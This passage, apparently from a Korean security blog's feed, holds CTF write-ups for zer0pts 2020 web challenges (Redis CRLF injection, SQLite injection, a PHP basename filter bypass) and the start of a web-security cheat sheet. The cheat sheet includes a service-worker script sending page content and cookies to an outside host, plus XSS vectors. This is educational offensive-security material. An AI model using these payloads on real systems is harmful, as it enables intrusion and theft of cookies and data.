class="line">User-Agent: zer0pts&#123;M4sh1m4fr3sh!!&#125;</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;challenge&#x2F;post.php?id&#x3D;2116dfe6-5cf1-459a-b575-cd59b08cdfa5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US</span><br></pre></td></tr></table></figure><h2 id="435pts-urlapp"><a href="#435pts-urlapp" class="headerlink" title="[435pts] urlapp"></a>[435pts] urlapp</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/urlapp_ddd9109207a713b8bcdc2a300bef27b6.tar.gz" target="_blank" rel="noopener">urlapp.tar.gz</a></li></ul><blockquote><p>application <a href="http://3.112.201.75:8004/" target="_blank" rel="noopener">here</a></p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'uri'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line">  sock = TCPSocket.open(<span class="string">"redis"</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ping(sock) <span class="keyword">then</span></span><br><span class="line">    exit</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sock</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(sock, cmd)</span></span></span><br><span class="line">  sock.write(cmd + <span class="string">"\r\n"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(sock)</span></span></span><br><span class="line">  data = sock.gets</span><br><span class="line">  <span class="keyword">if</span> data == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"+"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> data[<span class="number">1</span>..-<span class="number">1</span>].strip</span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"$"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">"$-1\r\n"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> sock.gets.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(sock)</span></span></span><br><span class="line">  query(sock, <span class="string">"ping"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"PONG"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">"SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"OK"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">"GET <span class="subst">#&#123;key&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">"flag"</span>, File.read(<span class="string">"flag.txt"</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">'index.html'</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">"H*"</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">"<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>루비로 구성된 redis ssrf 문제입니다.<br>개행에 대한 처리가 되어있지 않으므로 flag 키에 저장된 값을 가져와 원하는 대로 저장해서 불러와주면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request 1</span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;rwx.kr</span><br><span class="line">eval &quot;redis.call(&#39;set&#39;,&#39;e41cf0f94e050661&#39;,&#39;http:&#x2F;&#x2F;rwx.kr?&#39;..redis.call(&#39;get&#39;,&#39;flag&#39;));return 1;&quot; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Request 2</span><br><span class="line">GET &#x2F;?q&#x3D;e41cf0f94e050661 HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Location: http:&#x2F;&#x2F;rwx.kr?zer0pts&#123;sh0rt_t0_10ng_10ng_t0_sh0rt&#125;</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Xss-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Server: WEBrick&#x2F;1.6.0 (Ruby&#x2F;2.7.0&#x2F;2019-12-25)</span><br><span class="line">Date: Sun, 08 Mar 2020 21:40:28 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="755pts-phpNantokaAdmin"><a href="#755pts-phpNantokaAdmin" class="headerlink" title="[755pts] phpNantokaAdmin"></a>[755pts] phpNantokaAdmin</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/phpNantokaAdmin_49b112bf908ecef40f17684f4120b0aa.tar.gz" target="_blank" rel="noopener">phpNantokaAdmin</a></li></ul><blockquote><p><strong>phpNantokaAdmin</strong> is a management tool for SQLite.</p></blockquote><p>Sqlite injection 문제입니다. 기존에 sqlite 에 대한 연구가 부족했기에 푸는데에 꽤나 오래 걸렸습니다.</p><p>본 문제를 해결하기 위해 응용되는 sqlite 문법은 총 3가지 입니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">sql</span>] <span class="keyword">from</span> sqlite_master;</span><br></pre></td></tr></table></figure><p>첫번째는 square bracket 입니다.<br>mssql 구문과의 호환성을 위해 sqlite 에서는 square bracket 을 다른 쿼트와 같은 기능을 할 수 있도록 지원하고 있습니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sometbl (somecol <span class="built_in">INT</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sometbl <span class="keyword">values</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> somecol <span class="keyword">from</span> sometbl;</span><br><span class="line">// 1</span><br><span class="line"><span class="keyword">select</span> somecol somecoaaaal <span class="keyword">from</span> sometbl;</span><br><span class="line">// 1</span><br></pre></td></tr></table></figure><p>두번째는 잘못된 문법 사용에 대한 것인데, sqlite 에서는 컬럼 사이에 반점을 붙여주지 않으면 실제로 존재하는 컬럼인지에 관계없이 뒤에 오는 컬럼명을 무시합니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sometbl2 <span class="keyword">as</span> <span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> sometbl2;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>세번째는 <code>create table .. as select ..</code> 문입니다.<br>본 구문은 괄호 없이 테이블 생성을 가능하도록 합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?page&#x3D;create HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">table_name&#x3D;[aaa]as select [sql][&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/img/2020/03/image-20200309090320124.png" alt="image-20200309090320124"></p><p>위에서 제시한 세가지 문법을 사용한 후, <code>/?page=index</code> 에 접속하면 플래그가 들어있는 테이블과 컬럼명을 확인할 수 있습니다. 이후에는 같은 방법으로 플래그를 읽으면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?page&#x3D;create HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">table_name&#x3D;[aaa]as select [flag_2a2d04c3][&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/img/2020/03/image-20200309090554181.png" alt="image-20200309090554181"></p><h2 id="345pts-Can-you-guess-it-2nd-solve"><a href="#345pts-Can-you-guess-it-2nd-solve" class="headerlink" title="[345pts] Can you guess it (2nd solve)"></a>[345pts] Can you guess it (2nd solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/Can%20you%20guess%20it%3F_ffc668f78ed564bf7a62463fd16bc26c.tar.gz" target="_blank" rel="noopener">Can_you_guess_it.tar.gz</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">'ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href="?source"&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="POST"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="text" name="guess"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="submit"&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>게싱을 가장한 필터 바이패스 문제입니다.</p><table><thead><tr><th>Path</th><th>PHP_SELF</th></tr></thead><tbody><tr><td>/</td><td>index.php</td></tr><tr><td>/index.php</td><td>index.php</td></tr><tr><td>/index.php/config.php</td><td>index.php/config.php</td></tr></tbody></table><p>먼저 우리는 <code>PHP_SELF</code>가 조작될 수 있는 값이라는 것을 알아야 합니다.</p><p>따라서 index.php 가 붙은 앞부분은 어쩔 수 없지만, 뒷부분은 자유롭게 컨트롤 가능하므로 basename 함수를 통해 highlight_file 함수 인자로 전달되므로 <code>index.php/config.php</code> 는 <code>config.php</code> 를 출력하게 만듭니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그러나 여기서 문제가 발생합니다.<br>정규식 필터링을 수행하고 있는데 이에 걸리면 즉시 종료됩니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(basename(<span class="string">"index.php/config.php/\xbb"</span>));</span><br><span class="line"><span class="comment">// "config.php"</span></span><br></pre></td></tr></table></figure><p>그러나 php는 우리를 배신하지 않습니다.<br>basename 함수는 뒤에 오는 <code>[\x80-\xff]</code> 범위의 문자열에 대해서는 철저히 무시합니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://3.112.201.75:8003/index.php/config.php/%bb?source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'FLAG'</span>, <span class="string">'zer0pts&#123;gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n&#125;'</span>);</span><br></pre></td></tr></table></figure><p>따라서 위 주소를 통해 플래그를 읽어올 수 있습니다.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web Security CheatSheet</title>
      <link href="/Web-Security-CheatSheet/"/>
      <url>/Web-Security-CheatSheet/</url>
      
        <content type="html"><![CDATA[<blockquote><p>This document is continuously updated.</p></blockquote><h2 id="cross-site-scripting"><a href="#cross-site-scripting" class="headerlink" title="cross site scripting"></a>cross site scripting</h2><ul><li><p><a href="http://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">http://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p></li><li><p>basic filter bypass</p></li><li><p>samesite cookie bypass</p></li><li><p>client side template injection</p><ul><li>angularjs</li><li>nodejs : ejs, pug nunjucks .. etc</li></ul></li><li><p>jsonp injection</p><ul><li>bom injection</li></ul></li><li><p>dom clobbering</p></li><li><p>uxss</p><ul><li><a href="https://github.com/posixlee/uxss-db" target="_blank" rel="noopener">https://github.com/posixlee/uxss-db</a></li></ul></li><li><p>open redirection</p><ul><li>oauth</li><li>csrf gadget</li></ul></li><li><p>service worker</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- page.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</span></span><br><span class="line"><span class="actionscript">        navigator.serviceWorker.register(<span class="string">'/ex.js'</span>, &#123; scope: <span class="string">'/'</span> &#125;)</span></span><br><span class="line"><span class="actionscript">            .then(<span class="function"><span class="keyword">function</span> <span class="params">(registration)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">'Registration successful, scope is:'</span>, registration.scope);</span></span><br><span class="line">            &#125;)</span><br><span class="line"><span class="actionscript">            .catch(<span class="function"><span class="keyword">function</span> <span class="params">(error)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">'Service worker registration failed, error:'</span>, error);</span></span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ex.js</span></span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Fetching:'</span>, event.request.url);</span><br><span class="line">    </span><br><span class="line">    event.respondWith(</span><br><span class="line">        fetch(event.request.url)</span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> response.text();</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">text</span>) </span>&#123;</span><br><span class="line">                fetch(<span class="string">'//rwx.kr/?data='</span> + <span class="built_in">encodeURI</span>(event.request.url));</span><br><span class="line">                fetch(<span class="string">'//rwx.kr/?data='</span> + <span class="built_in">encodeURI</span>(text));</span><br><span class="line">                fetch(<span class="string">'//rwx.kr/?data='</span> + <span class="built_in">encodeURI</span>(<span class="built_in">document</span>.cookie));</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Response(text, &#123; <span class="attr">headers</span>: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125; &#125;);</span><br><span class="line">            &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>chrome gold feature</p><ul><li><p>PNaCL</p><ul><li>이제 안통함 (아마 76버전까지?)</li><li><a href="https://github.com/posixlee/PNaCl_Leaker" target="_blank" rel="noopener">https://github.com/posixlee/PNaCl_Leaker</a></li></ul></li><li><p>Chromium-Intercept</p><ul><li>deface 에 쓰일 수 있음</li><li>응답 헤더가 <code>text/cache-manifest</code> 이어야 한다는 제한 사항이 있음</li><li>최신 버전에서 패치됨<ul><li><a href="https://www.chromestatus.com/feature/5125554036539392" target="_blank" rel="noopener">https://www.chromestatus.com/feature/5125554036539392</a></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CHROMIUM CACHE MANIFEST </span><br><span class="line">CACHE: </span><br><span class="line">NETWORK:  </span><br><span class="line">FALLBACK: </span><br><span class="line">CHROMIUM-INTERCEPT: </span><br><span class="line">&#x2F; return &#x2F;uploaded.html</span><br></pre></td></tr></table></figure></li></ul></li><li><p>library</p><ul><li>jquery <code>$.getJSON</code></li></ul></li><li><p>crlf injection</p><ul><li>urldecode</li><li>urldecode while http -&gt; https redirect (misconfigure)</li><li>http/2 mitigation<ul><li>연구 필요</li></ul></li></ul></li><li><p>csp bypass</p><ul><li>jsonp endpoints</li><li>unsafe-eval</li><li>client side template injection</li><li>response status code change e.g. 201</li><li><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></li><li><a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack%20In%20Bo%20-%20So%20we%20broke%20all%20CSPs...%20You%20won%27t%20guess%20what%20happened%20next%21.pdf" target="_blank" rel="noopener">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack%20In%20Bo%20-%20So%20we%20broke%20all%20CSPs...%20You%20won%27t%20guess%20what%20happened%20next%21.pdf</a></li></ul></li><li><p>autofocus with contenteditable</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">type</span>=<span class="string">contenteditable</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>browser dependent</p><ul><li><p>Chrome, Opera, Safari and Edge</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span> <span class="attr">tabindex</span>=<span class="string">"0"</span> <span class="attr">id</span>=<span class="string">"xss"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"-webkit-user-modify:read-write"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">id</span>=<span class="string">"xss"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"-webkit-user-modify:read-write-plaintext-only"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">id</span>=<span class="string">"xss"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Firefox</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onbeforescriptexecute</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>1<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MSIE10/11 &amp; Edge</p><figure 